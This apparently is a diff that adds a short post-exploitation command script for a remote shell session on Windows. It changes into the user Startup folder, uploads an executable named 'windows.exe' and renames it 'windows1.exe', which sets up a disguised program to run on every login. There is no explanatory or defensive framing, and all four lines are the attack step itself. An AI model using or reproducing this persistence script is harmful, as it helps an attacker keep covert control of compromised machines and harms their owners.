@@ -1,0 +1,4 @@
+cd C:/ProgramData/Microsoft/Windows/Start' 'Menu/Programs/Startup
+upload windows.exe
+mv windows.exe windows1.exe
+exit
